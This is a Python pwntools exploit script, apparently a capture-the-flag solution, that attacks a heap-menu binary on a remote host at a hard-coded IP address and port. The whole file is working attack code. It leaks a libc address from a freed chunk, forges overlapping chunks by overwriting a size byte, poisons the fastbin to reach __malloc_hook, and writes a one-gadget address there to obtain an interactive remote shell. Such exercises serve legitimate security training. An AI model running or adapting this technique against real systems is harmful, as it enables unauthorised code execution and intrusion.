from pwn import *


# p = process('./your')
p = remote('59.110.164.72', 10003)
elf = ELF('./your')
lib = ELF('./libc-2.23.so')


def fun_1():
    p.recvuntil(b'Your choice :')
    p.sendline(b'1')


def fun_2(mess):
    p.recvuntil(b'Your choice :')
    p.sendline(b'2')
    p.recvuntil(b'Please enter the background story of your character:')
    p.send(mess)


def fun_3():
    p.recvuntil(b'Your choice :')
    p.sendline(b'3')


def add(size_, mess):
    p.recvuntil(b':')
    p.sendline(b'1')
    p.recvuntil(b':')
    p.sendline(str(int(size_)).encode())
    p.recvuntil(b':')
    p.send(mess)


def edit_size(id_, size_):
    p.recvuntil(b':')
    p.sendline(b'2')
    p.recvuntil(b':')
    p.sendline(id_)
    p.recvuntil(b':')
    p.sendline(str(int(size_)).encode())


def edit_mess(id_, mess):
    p.recvuntil(b':')
    p.sendline(b'3')
    p.recvuntil(b':')
    p.sendline(id_)
    p.recvuntil(b':')
    p.send(mess)


def show(id_):
    p.recvuntil(b':')
    p.sendline(b'4')
    p.recvuntil(b':')
    p.send(id_)


def delete(id_):
    p.recvuntil(b':')
    p.sendline(b'5')
    p.recvuntil(b':')
    p.send(id_)


chunk_list = 0x6020e8
fun_1()
add(0x10, b'bbb')
add(0x10, b'aaa')
add(0x10, b'ccc')
delete(b'0')
delete(b'1')
delete(b'2')
add(0x90, b'aaa')   # 0
add(0x28, b'bbb')   # 1
delete(b'0')
add(0x98, b'a' * 8)  # 0
show(b'0')
malloc_hook = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\00')) - 88 - 0x10
base_addr = malloc_hook - lib.sym['__malloc_hook']
key = [0x45226, 0x4527a, 0xf03a4, 0xf1247]
ogg = base_addr + key[1]
add(0x20, b'aaa')   # 2
add(0x60, b'bbb')   # 3
delete(b'3')
add(0x20, b'ccc')   # 3
edit_mess(b'1', b'a' * 0x28 + b'\xa1')
delete(b'2')
add(0x90, b'a' * 0x20 + p64(0) + p64(0x71) + p64(malloc_hook - 0x28 + 5))   # 2
delete(b'0')
delete(b'1')
add(0x60, b'aaa')
add(0x60, b'aaa' + p64(0) * 2 + p64(ogg))
delete(b'0')
p.sendline(b'1')
p.interactive()
